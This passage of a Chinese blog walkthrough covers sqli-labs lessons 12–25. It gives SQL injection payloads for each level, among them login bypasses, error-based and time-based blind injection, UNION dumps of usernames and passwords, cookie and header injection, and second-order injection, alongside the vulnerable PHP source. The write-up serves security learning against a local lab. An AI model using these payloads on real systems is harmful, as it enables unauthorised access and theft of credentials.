title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入"><a href="#Less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入" class="headerlink" title="Less-12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)"></a>Less-12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)</h3><h4 id="手动注入-9"><a href="#手动注入-9" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#post传入</span></span><br><span class="line">uname=1&quot;)<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&amp;passwd=2</span></span><br></pre></td></tr></table></figure><h4 id="源码分析-10"><a href="#源码分析-10" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-13-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入"><a href="#Less-13-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入" class="headerlink" title="Less-13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)"></a>Less-13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</h3><h4 id="手动注入-10"><a href="#手动注入-10" class="headerlink" title="手动注入"></a>手动注入</h4><p>先用万能密码登录。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">uname=1&#x27;)<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&amp;passwd=2</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/j7OKIP4yh2SV8x5.png" alt="13.png"></p><p>登录成功后便可以使用布尔盲注爆库等信息。</p><h4 id="源码分析-11"><a href="#源码分析-11" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(&#x27;<span class="subst">$uname</span>&#x27;) and password=(&#x27;<span class="subst">$passwd</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入"><a href="#Less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入" class="headerlink" title="Less-14 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)"></a>Less-14 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</h3><h4 id="手动注入-11"><a href="#手动注入-11" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#万能密码</span></span><br><span class="line">admin&quot;<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"><span class="comment">#报错注入</span></span><br><span class="line">uname=admin<span class="string">&quot;and extractvalue(1,concat(0x7e,(select @<span class="variable">@version</span>),0x7e))#&amp;passwd=1&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/JoPmqcNLdfSwTi7.png" alt="14.png"></p><h4 id="源码分析-12"><a href="#源码分析-12" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=<span class="subst">$uname</span> and password=<span class="subst">$passwd</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="less-15-POST-Blind-Boolian-x2F-time-Based-Single-quotes-基于bool型-x2F-时间延迟单引号POST型盲注"><a href="#less-15-POST-Blind-Boolian-x2F-time-Based-Single-quotes-基于bool型-x2F-时间延迟单引号POST型盲注" class="headerlink" title="less-15 POST - Blind- Boolian&#x2F;time Based - Single quotes (基于bool型&#x2F;时间延迟单引号POST型盲注)"></a>less-15 POST - Blind- Boolian&#x2F;time Based - Single quotes (基于bool型&#x2F;时间延迟单引号POST型盲注)</h3><h4 id="手动注入-12"><a href="#手动注入-12" class="headerlink" title="手动注入"></a>手动注入</h4><p>使用延时注入，正确直接登录成功，否则延时5s。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">uname=admin&#x27;<span class="attribute">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))<span class="comment">#&amp;passwd=11&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h4 id="源码分析-13"><a href="#源码分析-13" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-16-POST-Blind-Boolian-x2F-Time-Based-Double-quotes-基于bool型-x2F-时间延迟的双引号POST型盲注"><a href="#Less-16-POST-Blind-Boolian-x2F-Time-Based-Double-quotes-基于bool型-x2F-时间延迟的双引号POST型盲注" class="headerlink" title="Less-16 POST - Blind- Boolian&#x2F;Time Based - Double quotes (基于bool型&#x2F;时间延迟的双引号POST型盲注)"></a>Less-16 POST - Blind- Boolian&#x2F;Time Based - Double quotes (基于bool型&#x2F;时间延迟的双引号POST型盲注)</h3><h4 id="手动注入-13"><a href="#手动注入-13" class="headerlink" title="手动注入"></a>手动注入</h4><p>使用延时注入，正确直接登录成功，否则延时5s。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">uname=admin&quot;)<span class="attribute">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))<span class="comment">#&amp;passwd=11&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h4 id="源码分析-14"><a href="#源码分析-14" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-17-POST-Update-Query-Error-Based-String-基于错误的更新查询POST注入"><a href="#Less-17-POST-Update-Query-Error-Based-String-基于错误的更新查询POST注入" class="headerlink" title="Less-17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)"></a>Less-17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)</h3><h4 id="手动注入-14"><a href="#手动注入-14" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#报错注入</span></span><br><span class="line">uname=admin&amp;passwd=11&#x27;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e))<span class="comment">#&amp;submit=Submit</span></span><br><span class="line"><span class="comment">#延时注入</span></span><br><span class="line">uname=admin&amp;passwd=<span class="number">11</span><span class="string">&#x27;and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h4 id="源码分析-15"><a href="#源码分析-15" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// truncation (see comments)</span></span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$uname</span>=<span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>在<code>less-17</code>的<code>check_input()</code>中，对 username 进行各种转义的处理，所以此处不能使用username进行注入。</p><h4 id="函数简介"><a href="#函数简介" class="headerlink" title="函数简介"></a>函数简介</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">addslashes</span>() <span class="comment">#函数返回在预定义字符之前添加反斜杠的字符串，如单引号（&#x27;），双引号（&quot;），反斜杠（\），NULL。</span></span><br><span class="line"><span class="title function_ invoke__">stripslashes</span>() <span class="comment">#函数删除由 addslashes() 函数添加的反斜杠。</span></span><br><span class="line"><span class="title function_ invoke__">mysql_real_escape_string</span>() <span class="comment">#函数转义 SQL 语句中使用的字符串中的特殊字符,如\x00，\n，\r，\，&#x27;，&quot;，\x1a。</span></span><br></pre></td></tr></table></figure><h3 id="Less-18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入"><a href="#Less-18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入" class="headerlink" title="Less-18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)"></a>Less-18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)</h3><h4 id="手动注入-15"><a href="#手动注入-15" class="headerlink" title="手动注入"></a>手动注入</h4><p>利用抓包工具修改<code>user-agent</code>即可</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">&#x27;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e)) and <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/HklOqKTNYZFoMuD.png" alt="18_2.png"></p><h4 id="源码分析-16"><a href="#源码分析-16" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure><p>对 uname 和 passwd 进行了 check_input()函数的处理，所以我们在输入uname 和passwd上进行注入是不行的，但可以利用insert。</p><h3 id="Less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入"><a href="#Less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入" class="headerlink" title="Less-19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)"></a>Less-19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)</h3><h4 id="手动注入-16"><a href="#手动注入-16" class="headerlink" title="手动注入"></a>手动注入</h4><p>修改<code>referer</code>即可。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">&#x27;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@basedir</span>),0x7e)) and <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><h4 id="源码分析-17"><a href="#源码分析-17" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入"><a href="#Less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入" class="headerlink" title="Less-20 POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)"></a>Less-20 POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)</h3><h4 id="手动注入-17"><a href="#手动注入-17" class="headerlink" title="手动注入"></a>手动注入</h4><p>添加<code>cookie</code>即可</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">uname=admin1&#x27;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@basedir</span>),0x7e))<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/VdL9Es5qwCboOKx.png" alt="20.png"></p><h4 id="源码分析-18"><a href="#源码分析-18" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="variable">$cookee</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure><h3 id="Less-21-Cookie-Injection-Error-Based-complex-string"><a href="#Less-21-Cookie-Injection-Error-Based-complex-string" class="headerlink" title="Less-21 Cookie Injection- Error Based- complex - string"></a>Less-21 Cookie Injection- Error Based- complex - string</h3><h4 id="手动注入-18"><a href="#手动注入-18" class="headerlink" title="手动注入"></a>手动注入</h4><p>对<code>Cookie</code>进行<code>base64</code>编码即可</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">Cookie：</span><br><span class="line">uname=YWRtaW4xJylhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQGJhc2VkaXIpLDB4N2UpKSM=</span><br></pre></td></tr></table></figure><h4 id="源码分析-19"><a href="#源码分析-19" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))   <span class="comment">// Quote if not a number</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$value</span>) . <span class="string">&#x27;&quot;&#x27;</span>; <span class="comment">//添加了&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure><h3 id="Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入"><a href="#Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入" class="headerlink" title="Less-22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)"></a>Less-22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)</h3><h4 id="手动注入-19"><a href="#手动注入-19" class="headerlink" title="手动注入"></a>手动注入</h4><p>与less-21一样需要base64编码</p><h4 id="源码分析-20"><a href="#源码分析-20" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))   <span class="comment">// Quote if not a number</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;<span class="comment">//添加了&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure><h2 id="Page-2-Advanced-Injections"><a href="#Page-2-Advanced-Injections" class="headerlink" title="Page-2 (Advanced Injections)"></a>Page-2 (Advanced Injections)</h2><h3 id="Less-23-GET-Error-based-strip-comments-基于错误的，过滤注释的GET型"><a href="#Less-23-GET-Error-based-strip-comments-基于错误的，过滤注释的GET型" class="headerlink" title="Less-23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)"></a>Less-23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)</h3><h4 id="手动注入-20"><a href="#手动注入-20" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取路径</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,@<span class="variable">@basedir</span>,<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#获取数据库名</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(schema_name) from information_schema.schemata),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#获取security中所有表名</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#获取users中所有列名</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(column_name) from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#获取users中username这一列内容</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(username) from security.users limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#获取users中password这一列内容</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(password) from security.users limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#报错注入获取数据库名</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=1&#x27;</span>or extractvalue(<span class="number">1</span>,concat(0x7e,database())) or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><h4 id="源码分析-21"><a href="#源码分析-21" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//filter the comments out so as to comments should not work</span></span><br><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><p>过滤了<code>#</code>和<code>--</code>这两种注释符号。</p><h3 id="Less-24-Second-Degree-Injections-Real-treat-Store-Injections-二次注入"><a href="#Less-24-Second-Degree-Injections-Real-treat-Store-Injections-二次注入" class="headerlink" title="Less - 24 Second Degree Injections Real treat -Store Injections (二次注入)"></a>Less - 24 Second Degree Injections Real treat -Store Injections (二次注入)</h3><h4 id="手动注入-21"><a href="#手动注入-21" class="headerlink" title="手动注入"></a>手动注入</h4><p>注册一个账号为<code>admin&#39;#</code>的账户</p><p><img src="https://s2.loli.net/2022/05/17/DHwAEfZskga84Cb.png" alt="24_1.png"></p><p>注册成功后在后台可以看到信息</p><p><img src="https://s2.loli.net/2022/05/17/r3VvX1DF96auLeI.png" alt="24_2.png"></p><p>用刚注册的账号登录并修改密码即可更改<code>admin</code>的密码</p><p><img src="https://s2.loli.net/2022/05/17/vnFTACyI8aXpM9J.png" alt="24_3.png"></p><h4 id="源码分析-22"><a href="#源码分析-22" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-25-Trick-with-OR-amp-AND-过滤了or和and"><a href="#Less-25-Trick-with-OR-amp-AND-过滤了or和and" class="headerlink" title="Less-25 Trick with OR &amp; AND (过滤了or和and)"></a>Less-25 Trick with OR &amp; AND (过滤了or和and)</h3><h4 id="绕过or和and过滤"><a href="#绕过or和and过滤" class="headerlink" title="绕过or和and过滤"></a>绕过or和and过滤</h4><p>（1）大小写变形 Or,OR,oR </p><p>（2）编码，hex，urlencode </p><p>（3）添加注释&#x2F;*or*&#x2F; </p><p>（4）利用符号 and&#x3D;&amp;&amp; or&#x3D;||</p><h4 id="手动注入-22"><a href="#手动注入-22" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-25/?id=1&#x27;||1=1--+ </span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-25/?id=1&#x27;<span class="attribute">OOrr</span> <span class="number">1</span>=<span class="number">1</span>--+ </span><br></pre></td></tr></table></figure><h4 id="源码分析-23"><a href="#源码分析-23" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span 